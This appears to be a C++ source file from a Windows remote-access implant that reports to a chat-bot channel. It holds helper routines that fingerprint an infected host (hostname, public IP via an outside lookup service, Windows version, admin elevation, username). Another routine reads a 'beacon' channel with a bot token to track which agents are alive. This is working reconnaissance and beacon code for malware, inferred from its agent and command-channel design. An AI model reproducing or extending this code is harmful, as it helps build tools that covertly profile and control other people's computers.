#include "agents/callback_utils.h"
#include "agents/Callback.h"
#include <random>
#include <iostream>
#include <lmcons.h>

int64_t generate_agent_id() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<int64_t> dist(1000, 9999);
    return dist(gen);
}

std::string GetHostname() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed in GetHostname: " << WSAGetLastError() << std::endl;
        return "Unknown_WSAInitFail";
    }

    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        std::string result(hostname);
        if (!result.empty()) {
            WSACleanup();
            return result;
        }
        else {
            std::cout << "gethostname returned empty string" << std::endl;
        }
    }
    else {
        std::cerr << "gethostname failed: " << WSAGetLastError() << std::endl;
    }

    WSACleanup();
    return "Unknown";
}

std::string getPublicIP() {
    static std::string cachedIP;
    if (!cachedIP.empty()) {
        return cachedIP;
    }

    HINTERNET hSession = nullptr;
    HINTERNET hConnect = nullptr;
    HINTERNET hRequest = nullptr;
    std::string result;
    hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession) {
        hConnect = WinHttpConnect(hSession, L"api.ipify.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (hConnect) {
            hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/", nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            if (hRequest) {
                LPCWSTR headers = L"Accept: text/plain\r\nUser-Agent: WinHTTP";
                if (WinHttpAddRequestHeaders(hRequest, headers, -1L, WINHTTP_ADDREQ_FLAG_ADD)) {
                    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
                        if (WinHttpReceiveResponse(hRequest, nullptr)) {
                            DWORD dwSize = 0;
                            DWORD dwDownloaded = 0;
                            char* pszOutBuffer;
                            do {
                                dwSize = 0;
                                if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                                    break;
                                }
                                if (dwSize == 0) {
                                    break;
                                }
                                pszOutBuffer = new char[dwSize + 1];
                                if (!pszOutBuffer) {
                                    break;
                                }
                                ZeroMemory(pszOutBuffer, dwSize + 1);
                                if (WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
                                    result.append(pszOutBuffer, dwDownloaded);
                                }
                                delete[] pszOutBuffer;
                            } while (dwSize > 0);
                        }
                    }
                }
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
    cachedIP = result;
    return cachedIP;
}

std::string GetUniversalTime() {
    SYSTEMTIME utcTime;
    GetSystemTime(&utcTime);
    TIME_ZONE_INFORMATION customTzi = { 0 };
    customTzi.Bias = config::cfg.timezone_offset_minutes;
    if (config::cfg.use_dst) {
        if (utcTime.wMonth > 3 && utcTime.wMonth < 11) {
            customTzi.Bias -= 60;
        }
    }

    SYSTEMTIME localTime;
    if (!SystemTimeToTzSpecificLocalTime(&customTzi, &utcTime, &localTime)) {
        return "Error: Failed to convert to " + config::cfg.timezone_name + " time - " + std::to_string(GetLastError());
    }

    std::stringstream ss;
    ss << std::setfill('0') << std::setw(4) << localTime.wYear << "-"
        << std::setw(2) << localTime.wMonth << "-"
        << std::setw(2) << localTime.wDay << " "
        << std::setw(2) << localTime.wHour << ":"
        << std::setw(2) << localTime.wMinute << ":"
        << std::setw(2) << localTime.wSecond;
    return ss.str();
}

typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOEXW);
std::string GetWindowsVersion() {
    RTL_OSVERSIONINFOEXW osInfo = { sizeof(osInfo) };
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll) {
        RtlGetVersionPtr rtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
        if (rtlGetVersion && rtlGetVersion(&osInfo) == 0) {
            if (osInfo.dwMajorVersion == 10) {
                if (osInfo.dwBuildNumber >= 22000) {
                    return "Windows 11";
                }
                else {
                    return "Windows 10";
                }
            }
            if (osInfo.dwMajorVersion == 6 && osInfo.dwMinorVersion == 1) return "Windows 7";
            if (osInfo.dwMajorVersion == 6 && osInfo.dwMinorVersion == 2) return "Windows 8";
            return "Unknown Windows Version (" + std::to_string(osInfo.dwMajorVersion) + "." +
                std::to_string(osInfo.dwMinorVersion) + "." + std::to_string(osInfo.dwBuildNumber) + ")";
        }
    }
    return "Unknown (RtlGetVersion failed)";
}
bool IsAdmin() {
    BOOL isAdmin = FALSE;
    HANDLE token = nullptr;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(elevation);
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isAdmin = elevation.TokenIsElevated;
        }
        CloseHandle(token);
    }
    return isAdmin;
}
std::string GetUsername() {
    char username[UNLEN + 1];
    DWORD size = UNLEN + 1;
    if (GetUserNameA(username, &size)) {
        return std::string(username);
    }
    return "Unknown";
}

std::unordered_set<int64_t> get_unique_agent_ids(const config::BotConfig& cfg) {
    std::vector<std::pair<std::string, std::string>> messages = GetMessagesFromChannel(cfg.token, cfg.beacon_chanel_id);
    std::unordered_set<int64_t> uniqueAgentIds;

    for (const auto& message : messages) {
        const std::string& content = message.second;
        size_t titlePos = content.find("Title: Agent #");
        if (titlePos != std::string::npos) {
            size_t start = titlePos + 13;
            size_t end = content.find('\n', start);
            if (end != std::string::npos) {
                std::string agentIdStr = content.substr(start, end - start);
                agentIdStr.erase(std::remove(agentIdStr.begin(), agentIdStr.end(), '#'), agentIdStr.end());
                if (agentIdStr.find("~~") != std::string::npos) {
                    std::cerr << "Skipping dead agent ID: '" << agentIdStr << "' in message: '" << content << "'" << std::endl;
                    continue;
                }
                if (!agentIdStr.empty() && agentIdStr.find_first_not_of("0123456789") == std::string::npos) {
                    int64_t agentId = std::stoll(agentIdStr);
                    uniqueAgentIds.insert(agentId);
                }
                else {
                    std::cerr << "Skipping invalid agent ID: '" << agentIdStr << "' in message: '" << content << "'" << std::endl;
                }
            }
        }
    }
    return uniqueAgentIds;
}